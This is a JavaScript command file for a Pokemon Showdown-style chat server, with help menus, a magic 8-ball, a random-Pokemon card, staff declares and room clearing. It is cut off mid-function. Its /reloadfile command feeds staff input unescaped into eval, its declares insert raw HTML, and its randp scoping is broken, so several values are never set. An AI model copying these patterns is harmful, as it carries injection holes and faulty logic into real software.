'use strict';
/**
 * Miscellaneous commands
 */
const fs = require('fs');
const moment = require('moment');
const request = require('request');

function clearRoom(room) {
	let len = (room.log && room.log.length) || 0;
	let users = [];
	while (len--) {
		room.log[len] = '';
	}
	for (let u in room.users) {
		users.push(u);
		Users.get(u).leaveRoom(room, Users.get(u).connections[0]);
	}
	len = users.length;
	setTimeout(function () {
		while (len--) {
			Users.get(users[len]).joinRoom(room, Users.get(users[len]).connections[0]);
		}
	}, 1000);
}

let messages = [
	"has vanished into nothingness!",
	"used Explosion!",
	"fell into the void.",
	"went into a cave without a repel!",
	"has left the building.",
	"was forced to give StevoDuhHero's mom an oil massage!",
	"was hit by Magikarp's Revenge!",
	"ate a bomb!",
	"is blasting off again!",
	"(Quit: oh god how did this get here i am not good with computer)",
	"was unfortunate and didn't get a cool message.",
	"{{user}}'s mama accidently kicked {{user}} from the server!"
];

exports.commands = {
    cmds: 'serverhelp',
    eoshelp: 'serverhelp',
    serverhelp: function(target, room, user, connection) {
        if (!this.canBroadcast()) return;
        if (user.isStaff) {
            connection.sendTo(room.id, '|raw|<div class="infobox">\
            <center><b><u>List of <i>staff</i> commands:</u></b></center><br>\
            <b>/clearall</b> - Clear all messages in the room.<br>\
            <b>/endpoll</b> - End the poll in the room.<br>\
            <b>/givemoney</b> <i>name</i>, <i>amount</i> - Give a user a certain amount of money.<br>\
            <b>/hide</b> - Hide your staff symbol.<br>\
            <b>/pmall</b> <i>message</i> - Private message all users in the server.<br>\
            <b>/pmstaff</b> <i>message</i> - Private message all staff.<br>\
            <b>/poll</b> <i>question</i>, <i>option 1</i>, <i>option 2</i>... - Create a poll where users can vote on an option.<br>\
            <b>/reload</b> - Reload commands.<br>\
            <b>/reloadfile</b> <i>file directory</i> - Reload a certain file.<br>\
            <b>/resetmoney</b> <i>name</i> - Reset the user\'s money to 0.<br>\
            <b>/rmall</b> <i>message</i> - Private message all users in the room.<br>\
            <b>/show</b> - Show your staff symbol.<br>\
            <b>/strawpoll</b> <i>question</i>, <i>option 1</i>, <i>option 2</i>... - Create a strawpoll, declares the link to all rooms and pm all users in the server.<br>\
            <b>/toggleemoticons</b> - Toggle emoticons on or off.<br>\
            <b>/takemoney</b> <i>user</i>, <i>amount</i> - Take a certain amount of money from a user.<br>\
            <b>/trainercard</b> <i>help</i> - Makes adding trainer cards EZ.<br>\
                </div>');
        }
        if (!target || target === '1') {
            return this.sendReplyBox('\
            <center><b><u>List of commands (1/3):</u></b></center><br>\
            <b>/away</b> - Set yourself away.<br>\
            <b>/back</b> - Set yourself back from away.<br>\
            <b>/buy</b> <i>command</i> - Buys an item from the shop.<br>\
            <b>/customsymbol</b> <i>symbol</i> - Get a custom symbol.<br>\
            <b>/define</b> <i>word</i> - Shows the definition of a word.<br>\
            <b>/emotes</b> - Get a list of emoticons.<br>\
            <br>Use /cmds <i>number</i> to see more commands.\
            ');
        }
        if (target === '2') {
            return this.sendReplyBox('\
            <center><b><u>List of commands (2/3):</u></b></center><br>\
            <b>/hangman</b> help - Help on hangman specific commands.<br>\
            <b>/poof</b> - Disconnects the user and leaves a message in the room.<br>\
            <b>/profile</b> - Shows information regarding user\'s name, group, money, and when they were last seen.<br>\
            <b>/regdate</b> <i>user</i> - Gets registration date of the user.<br>\
            <br>Use /cmds <i>number</i> to see more commands.\
            ');
        }
        if (target === '3') {
            return this.sendReplyBox('\
            <center><b><u>List of commands (3/3):</u></b></center><br>\
            <b>/resetsymbol</b> - Reset custom symbol if you have one.<br>\
            <b>/richestusers</b> - Show the richest users.<br>\
            <b>/seen</b> <i>username</i> - Shows when the user last connected on the server.<br>\
            <b>/sell</b> <i>id</i> - Sells a card in the marketplace. Hover over your card to get the id.<br>\
            <b>/shop</b> - Displays the server\'s main shop.<br>\
            <b>/stafflist</b> - Shows the staff.<br>\
            <b>/tell</b> <i>username</i>, <i>message</i> - Send a message to an offline user that will be received when they log in.<br>\
            <b>/transfer</b> <i>user</i>, <i>amount</i> - Transfer a certain amount of money to a user.<br>\
            <b>/urbandefine</b> <i>word</i> - Shows the urban definition of the word.<br>\
            <b>/wallet</b> <i>user</i> - Displays how much money a user has. Parameter is optional.<br>\
            <br>Use /cmds <i>number</i> to see more commands.\
            ');
        }
    },
    
    leagueauthhelp: function (target, room, user) {
        if (!this.canBroadcast()) return;
            return this.sendReplyBox('\
            <center><b><u>League Auth Commands:</u></b></center><br>\
            <b>/roomtrainer</b> - Promotes a user to Gym Trainer.<br>\
            <b>/roomgleader</b> - Promotes a user to Gym Leader.<br>\
            <b>/roomelite</b> - Promotes a user to League Elite.<br>\
            <b>/roomchampion</b> - Promotes a user to League Champion.<br>\
            <b>/roombrain</b> - Promotes a user to Brain.<br>\
            <b>/roomfrontier</b> - Promotes a user to Frontier.<br>\
            <b>/roomrg</b> - Promotes a user to Royal Guard.<br>\
            <b>/roomprofessor</b> - Promotes a user to Professor.<br>\
            <b>/roomace</b> - Promotes a user to League Ace<br>\
            <b>/leaguedeauth</b> - Removes any level of League Auth from a user.<br>\
            <b>/leagueauth</b> - View all League Auth in the room.<br>\
            <br><i>League Auth ranks are symbolic, and give a person no access to moderation controls.\
            ');
    },
    
    easytour: 'etour',
    etour: function (target, room, user) {
	if (!this.can('broadcast', null, room)) return;
	this.parse('/tour new ' + target + ', elimination');
	
    },
    restart: function(target, room, user) {
		if (!this.can('lockdown')) return false;
		try {
			let forever = require('forever');
		} catch (e) {
			return this.sendReply("/restart requires the \"forever\" module.");
		}
		if (!Rooms.global.lockdown) {
			return this.sendReply("For safety reasons, /restart can only be used during lockdown.");
		}
		if (CommandParser.updateServerLock) {
			return this.sendReply("Wait for /updateserver to finish before using /restart.");
		}
		this.logModCommand(user.name + ' used /restart');
		Rooms.global.send('|refresh|');
		forever.restart('app.js');
	},
/*   
   forceshart: 'shart',
    shart: function (target, room, user, connection) {
		if (!target) return this.parse('/help roomban');
		if (room.isMuted(user) && !user.can('bypassall')) return this.sendReply("You cannot do this while unable to talk.");

		target = this.splitTarget(target);
		let targetUser = this.targetUser;
		let name = this.targetUsername;
		let userid = toId(name);

		if (!userid || !targetUser) return this.sendReply("User '" + name + "' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply("Room bans are not meant to be used in room " + room.id + ".");
		}
		if (room.bannedUsers[userid] && room.bannedIps[targetUser.latestIp]) return this.sendReply("User " + targetUser.name + " is already banned from room " + room.id + ".");
		if (targetUser in room.users) {
			targetUser.popup(
			"|html|<p>" + Tools.escapeHTML(user.name) + " has sharted on you " + ".</p>" + "</p>") +
				"<p>To appeal the ban, PM the staff member that banned you" + (room.auth ? " or a room owner. </p><p><button name=\"send\" value=\"/roomauth " + room.id + "\">List Room Staff</button></p>" : ".</p>")
			);
		}
		
		this.addModCommand("" + targetUser.name + " was sharted on in room " + room.id + " by " + user.name + "." + (target ? " (" + target + ")" : ""));
		let acAccount = (targetUser.autoconfirmed !== targetUser.userid && targetUser.autoconfirmed);
		let alts = room.roomBan(targetUser);
		if (alts.length) {
			this.privateModCommand("(" + targetUser.name + "'s " + (acAccount ? " ac account: " + acAccount + ", " : "") + "roombanned alts: " + alts.join(", ") + ")");
			for (let i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		} else if (acAccount) {
			this.privateModCommand("(" + targetUser.name + "'s ac account: " + acAccount + ")");
		}
		this.add('|unlink|' + this.getLastIdOf(targetUser));
	},
*/
    	helixfossil: 'm8b',
	helix: 'm8b',
	magic8ball: 'm8b',
	m8b: function(target, room, user) {
		if (!this.canBroadcast()) return;
		let random = Math.floor(20 * Math.random()) + 1;
		let results = '';
		if (random == 1) {
			results = 'Signs point to yes.';
		}
		if (random == 2) {
			results = 'Yes.';
		}
		if (random == 3) {
			results = 'Reply hazy, try again.';
		}
		if (random == 4) {
			results = 'Without a doubt.';
		}
		if (random == 5) {
			results = 'My sources say no.';
		}
		if (random == 6) {
			results = 'As I see it, yes.';
		}
		if (random == 7) {
			results = 'You may rely on it.';
		}
		if (random == 8) {
			results = 'Concentrate and ask again.';
		}
		if (random == 9) {
			results = 'Outlook not so good.';
		}
		if (random == 10) {
			results = 'It is decidedly so.';
		}
		if (random == 11) {
			results = 'Better not tell you now.';
		}
		if (random == 12) {
			results = 'Very doubtful.';
		}
		if (random == 13) {
			results = 'Yes - definitely.';
		}
		if (random == 14) {
			results = 'It is certain.';
		}
		if (random == 15) {
			results = 'Cannot predict now.';
		}
		if (random == 16) {
			results = 'Most likely.';
		}
		if (random == 17) {
			results = 'Ask again later.';
		}
		if (random == 18) {
			results = 'My reply is no.';
		}
		if (random == 19) {
			results = 'Outlook good.';
		}
		if (random == 20) {
			results = 'Don\'t count on it.';
		}
		return this.sendReplyBox('' + results + '');
	},
	
	   	declaregreen: 'declarered',
		declarered: function (target, room, user, connection, cmd) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;
		if (!this.canTalk() && !user.can('bypassall')) return this.sendReply('You cannot do this while unable to talk.');

		room.addRaw('<div class="broadcast-' + cmd.substr(7) + '"><b>' + target + '</b></div>');
		room.update();
		this.logModCommand(user.name + ' declared ' + target);
	},

	sd: 'declaremod',
	staffdeclare: 'declaremod',
	modmsg: 'declaremod',
	moddeclare: 'declaremod',
	declaremod: function (target, room, user, connection) {
		if (!target) return this.parse('/help declaremod');
		if ((user.locked || room.isMuted(user)) && !user.can('bypassall')) return this.sendReply("You cannot do this while unable to talk.");
		if (!this.can('receiveauthmessages', null, room)) return false;
		return this.privateModCommand('|raw|<div class="broadcast-red"><b><font size=1><i>Private Auth (Driver +) declare from ' + user.name + '<br /></i></font size>' + target + '</b></div>');
	},
	declaremodhelp: ["/declaremod [note] - Adds a staff readable declare. Requires: % @ # & ~"],
	
	
	roomlist: function (target, room, user) {
        if(!this.can('declare')) return;
 
        let rooms = Object.keys(Rooms.rooms),
            len = rooms.length,
            official = ['<b><font color="#1a5e00" size="2">Official chat rooms</font></b><br><br>'],
            nonOfficial = ['<hr><b><font color="#000b5e" size="2">Chat rooms</font></b><br><br>'],
            privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms</font></b><br><br>'];
 
        while (len--) {
            let _room = Rooms.rooms[rooms[(rooms.length - len) - 1]];
            if (_room.type === 'chat') {
                if (_room.isOfficial) {
                    official.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
                    continue;
                }
                if (_room.isPrivate) {
                    privateRoom.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
                    continue;
                }
                nonOfficial.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
            }
        }
 
        this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
    },
    
	randp: function (target, room, user) {
	let fs = require('fs');
	let fileName = "pokedex.js";
	if (!this.canBroadcast()) return;
	let shinyPoke = '';
	let x = '';
	if (/shiny/i.test(target)) {
		let shinyPoke = '-shiny';
	}
	let kanto = false; let johto = false; let hoenn = false; let sinnoh = false; let kalos = false; let unova = false;
	if (/kanto/i.test(target) || /gen 1/i.test(target)) {
		let kalos = true;
		let x = Math.floor(Math.random() * (174 - 1)) + 1;
	} else if (/johto/i.test(target) || /gen 2/i.test(target)) {
		let johto = true;
		let x = Math.floor(Math.random() * (281 - 173)) + 173;
	} else if (/hoenn/i.test(target) || /gen 3/i.test(target)) {
		let hoenn = true;
		let x = Math.floor(Math.random() * (444 - 280)) + 280;
	} else if (/sinnoh/i.test(target) || /gen 4/i.test(target)) {
		let sinnoh = true;
		let x = Math.floor(Math.random() * (584 - 443)) + 443;
	} else if (/kalos/i.test(target) || /gen 5/i.test(target)) {
		let kalos = true;
		let x = Math.floor(Math.random() * (755 - 583)) + 583;
	} else if (/unova/i.test(target) || /gen 6/i.test(target)) {
		let unova = true;
		let x = Math.floor(Math.random() * (834 - 752)) + 752;
	}
	if (kanto === false && johto === false && hoenn === false && sinnoh === false && kalos === false && unova === false) {
		let x = Math.floor(Math.random() * (856 - 1)) + 1;
	}
	let randP = '';
	let pokeNum = parseInt(x);
	let pokedex = fs.readFileSync('./data/pokedex.js').toString().split("\n");
	let pokemon = (pokedex[x]);
	let speciesIndex1 = pokemon.indexOf('species:"') + 9; let speciesIndex2 = pokemon.indexOf('",', speciesIndex1);
	let pokeName = pokemon.slice(speciesIndex1, speciesIndex2);
	let type1Index1 = pokemon.indexOf(',types:["') + 9; let type1Index2 = pokemon.indexOf('"],', type1Index1);
	let pokeType2 = '';
	if (/,/.test(pokemon.slice(type1Index1, type1Index2))) {
		let type1Index2 = pokemon.indexOf('","', type1Index1);
		let type2Index1 = pokemon.indexOf('","', type1Index1) + 3; let type2Index2 = pokemon.indexOf('"],', type2Index1);
		let pokeType2 = '<img src="http://play.pokemonshowdown.com/sprites/types/' + pokemon.slice(type2Index1, type2Index2) + '.png" width="32" height="14">';
	}
	let pokeType1 = '<img src="http://play.pokemonshowdown.com/sprites/types/' + pokemon.slice(type1Index1, type1Index2) + '.png" width="32" height="14">';
	let ability1Index1 = pokemon.indexOf(',abilities:{0:"') + 15; let ability1Index2 = pokemon.indexOf('"},h', ability1Index1);
	let pokeAbility2 = '';
	let pokeAbility3 = '';
	if (/",/.test(pokemon.slice(ability1Index1, ability1Index2))) {
		if (/",H:"/.test(pokemon.slice(ability1Index1, ability1Index2))) {
			let ability1Index2 = pokemon.indexOf('",H:"', ability1Index1);
			let ability3Index1 = pokemon.indexOf('",H:"', ability1Index1) + 5; let ability3Index2 = pokemon.indexOf('"', ability3Index1);
			let pokeAbility3 = ', ' + pokemon.slice(ability3Index1, ability3Index2);
		}
		if (/",1:"/.test(pokemon.slice(ability1Index1, ability1Index2))) {
			let ability1Index2 = pokemon.indexOf('",1:"', ability1Index1);
			let ability2Index1 = pokemon.indexOf('",1:"', ability1Index1) + 5; let ability2Index2 = pokemon.indexOf('"', ability2Index1);
			let pokeAbility2 = ', ' + pokemon.slice(ability2Index1, ability2Index2);
		}
	}
	let ability1Index2 = pokemon.indexOf('"', ability1Index1);
	let pokeAbility1 = pokemon.slice(ability1Index1, ability1Index2);
	let hpIndex1 = pokemon.indexOf('hp:') + 3; let hpIndex2 = pokemon.indexOf(',', hpIndex1);
	let pokeHp = parseInt(pokemon.slice(hpIndex1, hpIndex2));
	let atkIndex1 = pokemon.indexOf('atk:') + 4; let atkIndex2 = pokemon.indexOf(',', atkIndex1);
	let pokeAtk = parseInt(pokemon.slice(atkIndex1, atkIndex2));
	let defIndex1 = pokemon.indexOf('def:') + 4; let defIndex2 = pokemon.indexOf(',', defIndex1);
	let pokeDef = parseInt(pokemon.slice(defIndex1, defIndex2));
	let spaIndex1 = pokemon.indexOf('spa:') + 4; let spaIndex2 = pokemon.indexOf(',', spaIndex1);
	let pokeSpa = parseInt(pokemon.slice(spaIndex1, spaIndex2));
	let spdIndex1 = pokemon.indexOf('spd:') + 4; let spdIndex2 = pokemon.indexOf(',', spdIndex1);
	let pokeSpd = parseInt(pokemon.slice(spdIndex1, spdIndex2));
	let speIndex1 = pokemon.indexOf('spe:') + 4; let speIndex2 = pokemon.indexOf('}', speIndex1);
	let pokeSpe = parseInt(pokemon.slice(speIndex1, speIndex2));
	let pokeBst = pokeHp + pokeAtk + pokeDef + pokeSpa + pokeSpd + pokeSpe;
	let pokeStats = 'HP ' + pokeHp + ' / Atk ' + pokeAtk + ' / Def ' + pokeDef + ' / SpA ' + pokeSpa + ' / SpD ' + pokeSpd + ' / Spe ' + pokeSpe + ' / BST ' + pokeBst;
	let colorIndex1 = pokemon.indexOf(',color:"') + 8; let colorIndex2 = pokemon.indexOf('",', colorIndex1);
	let pokeColor = pokemon.slice(colorIndex1, colorIndex2);
	let egg1Index1 = pokemon.indexOf(',eggGroups:["') + 13; let egg1Index2 = pokemon.indexOf('"]', egg1Index1);
	let pokeEgg2 = "";
	if (/,/.test(pokemon.slice(egg1Index1, egg1Index2))) {
		let egg1Index2 = pokemon.indexOf('","', egg1Index1);
		let egg2Index1 = pokemon.indexOf('","', egg1Index1) + 3; let egg2Index2 = pokemon.indexOf('"]', egg2Index1);
		let pokeEgg2 = ", " + pokemon.slice(egg2Index1, egg2Index2);
	}
	let pokeEgg1 = pokemon.slice(egg1Index1, egg1Index2);
	if (pokeName === "Ho-Oh" || pokeName === "Nidoran-F" || pokeName === "Nidoran-M" || pokeName === "Farfetch'd" || pokeName === "Porygon-Z") {
	randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/' + pokeName.toLowerCase().replace(/[-]+/g, '').replace(/[']+/g, '') + '.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
	} else if (pokeName === "Basculin-Blue-Striped") {
		randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/basculin-bluestriped.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
	} else if (pokeName === "Pichu-Spiky-eared") {
		randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/pichu-spikyeared.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
	} else if (pokeName === "Floette-Eternal-Flower") {
		randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/floette-eternalflower.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
	} else if (pokeName === "Missingno.") {
		let y = Math.floor(Math.random() * (6 - 1)) + 1;
		switch (y) {
		case 1:
			randP = '<table><tr><td><img src="http://cdn.bulbagarden.net/upload/9/98/Missingno_RB.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>None<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 2:
			randP = '<table><tr><td><img src="http://cdn.bulbagarden.net/upload/0/03/Missingno_Y.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>None<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 3:
			randP = '<table><tr><td><img src="http://cdn.bulbagarden.net/upload/a/aa/Spr_1b_141_f.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>None<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 4:
			randP = '<table><tr><td><img src="http://cdn.bulbagarden.net/upload/b/bb/Spr_1b_142_f.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>None<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 5:
			randP = '<table><tr><td><img src="http://cdn.bulbagarden.net/upload/9/9e/Ghost_I.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>None<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		default:
			break;
		}
	} else if (pokeName === "Pikachu-Cosplay") {
		let z = Math.floor(Math.random() * (6 - 1)) + 1;
		switch (z) {
		case 1:
			randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/pikachu-rock-star.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 2:
			randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/pikachu-belle.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 3:
			randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/pikachu-pop-star.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 4:
			randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/pikachu-phd.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		case 5:
			randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/pikachu-libre.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
			break;
		default:
			break;
		}
	} else {
		randP = '<table><tr><td><img src="http://play.pokemonshowdown.com/sprites/bw' + shinyPoke + '/' + pokeName.toLowerCase().replace(/[ ]+/g, '').replace(/[.]+/g, '').replace(/[']+/g, '') + '.png" height="96" width="96"></td><td><b>Name: </b>' + pokeName + '<br/><b>Type(s): </b>' + pokeType1 + ' ' + pokeType2 + '<br/><b>Ability: </b>' + pokeAbility1 + pokeAbility2 + pokeAbility3 + '<br/><b>Stats: </b>' + pokeStats + '<br/><b>Color: </b><font color="' + pokeColor + '">' + pokeColor + '</font><br/><b>Egg Group(s): </b>' + pokeEgg1 + pokeEgg2 + '</td></tr></table>';
	}
	this.sendReplyBox(randP);
	},
	
    fj: 'forcejoin',
    forcejoin: function(target, room, user) {
        if (!user.can('mute')) return false;
        if (!target) return this.sendReply('/forcejoin [target], [room] - Forces a user to join a room');
        let parts = target.split(',');
        if (!parts[0] || !parts[1]) return this.sendReply('/forcejoin [target], [room] - Forces a user to join a room');
        userid = toId(parts[0]);
        roomid = toId(parts[1]);
        if (!Users.get(userid)) return this.sendReply ('User not found.');
        if (!Rooms.get(roomid)) return this.sendReply ('Room not found.');
        Users.get(userid).joinRoom(roomid);
    },
/*    
    	pbl: 'pbanlist',
	permabanlist: 'pbanlist',
	pbanlist: function(target, room, user, connection) {
		if (!this.canBroadcast() || !user.can('lock')) return this.sendReply('/pbanlist - Access Denied.');
		let pban = fs.readFileSync('config/pbanlist.txt', 'utf8');
		return user.send('|popup|' + pban);
	},
*/
    reloadfile: function(target, room, user) {
        if (!this.can('reloadfile')) return this.sendReply('/reloadfile - Access denied.');
        if (!target) return this.sendReply('/reload [file directory] - Reload a certain file.');
        this.sendReply('|raw|<b>delete require.cache[require.resolve("' + target + '")]</b>');
        this.parse('/eval delete require.cache[require.resolve("' + target + '")]');
        this.sendReply('|raw|<b>require("' + target + '")</b>');
        this.parse('/eval require("' + target + '")');
    },
/*    
    pb: 'permaban',
	pban: 'permaban',
	permban: 'permaban',
	permaban: function(target, room, user) {
		if (!target) return this.sendReply('/permaban [username] - Permanently bans the user from the server. Bans placed by this command do not reset on server restarts. Requires: & ~');
		if (!this.can('pban')) return false;
		target = this.splitTarget(target);
		let targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User ' + this.targetUsername + ' not found.');
		}
		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			let problem = " but was already banned";
			return this.privateModCommand('(' + targetUser.name + " would be banned by " + user.name + problem + '.) (' + targetUser.latestIp + ')');
		}
		targetUser.popup(user.name + " has permanently banned you.");
		this.addModCommand(targetUser.name + " was permanently banned by " + user.name + ".");
		this.add('|unlink|hide|' + this.getLastIdOf(targetUser));
		targetUser.ban();
		ipbans.write('\n' + targetUser.latestIp);
	},
*/	
	cgdeclare: 'customgdeclare',
	customgdeclare: function (target, room, user) {
	let parts = target.split(',');
	if (!target) return this.parse('/help customgdeclare');
	if (!parts[4]) return this.parse('/help customgdeclare');
	if (!this.can('gdeclare')) return false;
 
	for (let id in Rooms.rooms) {
	if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-blue" style="border-radius: 5px;"><b>We are hosting a <font color="#57194A"><b>' + parts[0] + '</b></font> in <button name="send" value="/join ' + parts[1] + '" style="border-radius: 3px; margin: 3px; padding: 2px 5px; font-weight: bold; font-style: italic; box-shadow: 0px 0px 2px rgba(0, 0, 0, 0.35); color: #57194A; text-shadow: none;">' + parts[1] + '</button> !<br />The tier is <font style="color: #57194A; font-weight: bold;"><b>' + parts[2] + '</b></font>! Join up and have fun!<br /><br />The prize for the winner is <font style="color: #57194A; font-weight: bold;"><b>' + parts[3] + '</b></font> bucks, while the runner-up will get <font style="color: #57194A; font-weight: bold;"><b>' + parts[4] + '</b></font> bucks!<br /><small><i>~' + user.name + '</i></small></b></div>');
	}
	this.logModCommand(user.name + " globally custom declared " + target);
	},
	customgdeclarehelp: ["/customgdeclare [event name], [room], [tier], [buck reward], [runner-up buck reward] - Preset gdeclare which anonymously announces a message to every room on the server. Requires: &, ~"],

	stafflist: 'authority',
	auth: 'authority',
	authlist: 'authority',
	authority: function (target, room, user, connection) {
		let rankLists = {};
		let ranks = Object.keys(Config.groups);
		for (let u in Users.usergroups) {
			let rank = Users.usergroups[u].charAt(0);
			// In case the usergroups.csv file is not proper, we check for the server ranks.
			if (ranks.indexOf(rank) > -1) {
				let name = Users.usergroups[u].substr(1);
				if (!rankLists[rank]) rankLists[rank] = [];
				if (name) rankLists[rank].push(((Users.getExact(name) && Users.getExact(name).connected) ? '**' + name + '**' : name));
			}
		}

		let buffer = [];
		Object.keys(rankLists).sort(function (a, b) {
			return (Config.groups[b] || {rank: 0}).rank - (Config.groups[a] || {rank: 0}).rank;
		}).forEach(function (r) {
			buffer.push((Config.groups[r] ? r + Config.groups[r].name + "s (" + rankLists[r].length + ")" : r) + ":\n" + rankLists[r].sort().join(", "));
		});

		if (!buffer.length) buffer = "This server has no auth.";
		connection.popup(buffer.join("\n\n"));
	},

	clearall: function (target, room, user) {
		if (!this.can('declare')) return false;
		if (room.battle) return this.sendReply("You cannot clearall in battle rooms.");

		clearRoom(room);
	},

	gclearall: 'globalclearall',
	globalclearall: function (target, room, user) {
		if (!this.can('gdeclare')) return false;

		for (let u in Users.users) {
			Users.users[u].popup("All rooms are being clear.");
		}

